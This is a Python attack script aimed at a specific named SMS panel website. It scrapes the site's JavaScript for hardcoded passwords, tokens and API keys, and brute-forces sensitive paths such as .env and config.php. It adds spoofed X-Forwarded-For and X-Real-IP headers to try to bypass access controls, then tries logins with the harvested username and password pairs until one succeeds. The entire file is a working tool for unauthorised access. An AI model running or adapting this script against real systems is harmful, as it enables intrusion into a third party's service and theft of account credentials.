import requests
import re
import json
from bs4 import BeautifulSoup

class IPRNJSAnalyzer:
    def __init__(self):
        self.base_url = "https://panel.iprn-sms.com"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
    
    def extract_js_files(self):
        """Extract semua JS files dari halaman login"""
        print("[*] Extracting JavaScript files from login page...")
        
        try:
            r = self.session.get(f'{self.base_url}/login', timeout=15)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            js_files = []
            
            # Cari <script src="...">
            for script in soup.find_all('script', src=True):
                src = script['src']
                if not src.startswith('http'):
                    src = f"{self.base_url}{src}" if src.startswith('/') else f"{self.base_url}/{src}"
                js_files.append(src)
            
            # Cari inline scripts
            inline_scripts = []
            for script in soup.find_all('script'):
                if script.string and len(script.string) > 50:
                    inline_scripts.append(script.string)
            
            print(f"[+] Found {len(js_files)} external JS files")
            print(f"[+] Found {len(inline_scripts)} inline scripts")
            
            return js_files, inline_scripts
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return [], []
    
    def analyze_js_content(self, js_url):
        """Analisa content JS file untuk credentials atau endpoints"""
        print(f"\n[*] Analyzing: {js_url}")
        
        try:
            r = self.session.get(js_url, timeout=10)
            content = r.text
            
            findings = {
                'passwords': [],
                'tokens': [],
                'api_keys': [],
                'endpoints': [],
                'usernames': [],
            }
            
            # Regex patterns untuk cari credentials
            patterns = {
                'password': r'password["\']?\s*[:=]\s*["\']([^"\']{6,})["\']',
                'token': r'token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                'username': r'username["\']?\s*[:=]\s*["\']([^"\']{3,})["\']',
                'admin': r'admin["\']?\s*[:=]\s*["\']([^"\']{3,})["\']',
            }
            
            for key, pattern in patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    print(f"  [+] Found {key}: {matches}")
                    if key == 'password':
                        findings['passwords'].extend(matches)
                    elif key in ['token', 'api_key']:
                        findings['tokens'].extend(matches)
                    elif key in ['username', 'admin']:
                        findings['usernames'].extend(matches)
            
            # Cari API endpoints
            api_endpoints = re.findall(r'["\']/(api/[^"\']+)["\']', content)
            if api_endpoints:
                findings['endpoints'] = list(set(api_endpoints))
                print(f"  [+] Found {len(findings['endpoints'])} API endpoints")
                for ep in findings['endpoints'][:5]:
                    print(f"      {ep}")
            
            # Cari hardcoded credentials dalam format object
            cred_objects = re.findall(
                r'\{[^}]*username[^}]*password[^}]*\}',
                content,
                re.IGNORECASE
            )
            
            if cred_objects:
                print(f"  [+] Found potential credential objects:")
                for obj in cred_objects[:3]:
                    print(f"      {obj[:200]}")
            
            return findings
            
        except Exception as e:
            print(f"  [!] Error: {e}")
            return None
    
    def test_discovered_endpoints(self, endpoints):
        """Test endpoints yang ditemukan dari JS"""
        print(f"\n[*] Testing discovered endpoints...")
        
        accessible = []
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}/{endpoint}"
                
                # Test tanpa auth
                r1 = self.session.get(url, timeout=10, allow_redirects=False)
                
                # Test dengan bypass headers
                r2 = requests.get(
                    url,
                    headers={
                        **self.session.headers,
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '127.0.0.1'
                    },
                    timeout=10,
                    allow_redirects=False
                )
                
                if r1.status_code == 200 or r2.status_code == 200:
                    print(f"  [+] ACCESSIBLE: {endpoint}")
                    print(f"      Normal: {r1.status_code}, Bypass: {r2.status_code}")
                    
                    resp = r2 if r2.status_code == 200 else r1
                    
                    if len(resp.text) < 1000:
                        print(f"      Response: {resp.text[:300]}")
                    
                    try:
                        data = resp.json()
                        print(f"      JSON data: {json.dumps(data, indent=2)[:300]}")
                        accessible.append((endpoint, data))
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        return accessible
    
    def brute_common_endpoints(self):
        """Brute force common API endpoints"""
        print(f"\n[*] Bruteforcing common endpoints...")
        
        endpoints = [
            'api/login',
            'api/auth',
            'api/config',
            'api/settings',
            'api/user',
            'api/users/list',
            'api/admin/users',
            'api/v1/login',
            'api/v1/users',
            'login/api',
            'admin/api/config',
            'config.json',
            'settings.json',
            'users.json',
            '.env',
            'api.php',
            'login.php',
            'config.php',
        ]
        
        findings = []
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}/{endpoint}"
                
                # Dengan bypass headers
                r = requests.get(
                    url,
                    headers={
                        'User-Agent': 'Mozilla/5.0',
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '127.0.0.1',
                    },
                    timeout=10
                )
                
                if r.status_code == 200 and len(r.text) > 10:
                    print(f"  [+] {endpoint} - {r.status_code} - {len(r.text)} bytes")
                    
                    # Cek keywords sensitif
                    sensitive = ['password', 'token', 'key', 'secret', 'admin']
                    if any(kw in r.text.lower() for kw in sensitive):
                        print(f"      [!] CONTAINS SENSITIVE DATA!")
                        print(f"      Preview: {r.text[:200]}")
                        findings.append((endpoint, r.text))
                        
            except:
                pass
        
        return findings
    
    def run_full_analysis(self):
        print("="*70)
        print("  JAVASCRIPT & ENDPOINT ANALYSIS")
        print("  Target: https://panel.iprn-sms.com")
        print("="*70)
        
        # 1. Extract JS files
        js_files, inline_scripts = self.extract_js_files()
        
        all_findings = {
            'passwords': [],
            'tokens': [],
            'endpoints': [],
            'usernames': []
        }
        
        # 2. Analyze external JS
        for js_url in js_files[:10]:  # Limit 10 files
            findings = self.analyze_js_content(js_url)
            if findings:
                for key in all_findings:
                    all_findings[key].extend(findings.get(key, []))
        
        # 3. Analyze inline scripts
        print(f"\n[*] Analyzing inline scripts...")
        for i, script in enumerate(inline_scripts[:5]):
            print(f"\n[*] Inline script #{i+1} ({len(script)} chars)")
            
            # Cari credentials
            passwords = re.findall(r'password["\']?\s*[:=]\s*["\']([^"\']{6,})["\']', script, re.I)
            usernames = re.findall(r'username["\']?\s*[:=]\s*["\']([^"\']{3,})["\']', script, re.I)
            
            if passwords:
                print(f"  [+] Passwords found: {passwords}")
                all_findings['passwords'].extend(passwords)
            if usernames:
                print(f"  [+] Usernames found: {usernames}")
                all_findings['usernames'].extend(usernames)
        
        # 4. Test discovered endpoints
        if all_findings['endpoints']:
            accessible = self.test_discovered_endpoints(list(set(all_findings['endpoints']))[:10])
        
        # 5. Brute common endpoints
        findings = self.brute_common_endpoints()
        
        # Final summary
        print("\n" + "="*70)
        print("  ANALYSIS SUMMARY")
        print("="*70)
        
        if all_findings['usernames']:
            print(f"\n[+] Usernames discovered:")
            for u in set(all_findings['usernames']):
                print(f"    {u}")
        
        if all_findings['passwords']:
            print(f"\n[+] Passwords discovered:")
            for p in set(all_findings['passwords']):
                print(f"    {p}")
        
        if all_findings['tokens']:
            print(f"\n[+] Tokens/API Keys discovered:")
            for t in set(all_findings['tokens'])[:5]:
                print(f"    {t[:50]}...")
        
        # Try credentials jika ada
        if all_findings['usernames'] and all_findings['passwords']:
            print(f"\n[*] Attempting discovered credentials...")
            
            for username in set(all_findings['usernames'])[:3]:
                for password in set(all_findings['passwords'])[:3]:
                    try:
                        r = requests.post(
                            f'{self.base_url}/login',
                            data={'username': username, 'password': password},
                            timeout=10,
                            allow_redirects=False
                        )
                        
                        print(f"  [{username}:{password}] Status: {r.status_code}")
                        
                        if r.status_code == 302:
                            location = r.headers.get('Location', '')
                            print(f"      [SUCCESS] Redirect to: {location}")
                            
                            if 'dashboard' in location or 'admin' in location:
                                print(f"\n[!!!] VALID CREDENTIALS FOUND [!!!]")
                                print(f"      Username: {username}")
                                print(f"      Password: {password}")
                                return (username, password)
                                
                    except:
                        pass
        
        return None


if __name__ == "__main__":
    analyzer = IPRNJSAnalyzer()
    result = analyzer.run_full_analysis()
    
    if result:
        print(f"\n{'='*70}")
        print(f"  [FINAL RESULT] CREDENTIALS EXTRACTED")
        print(f"{'='*70}")
        print(f"  Username: {result[0]}")
        print(f"  Password: {result[1]}")
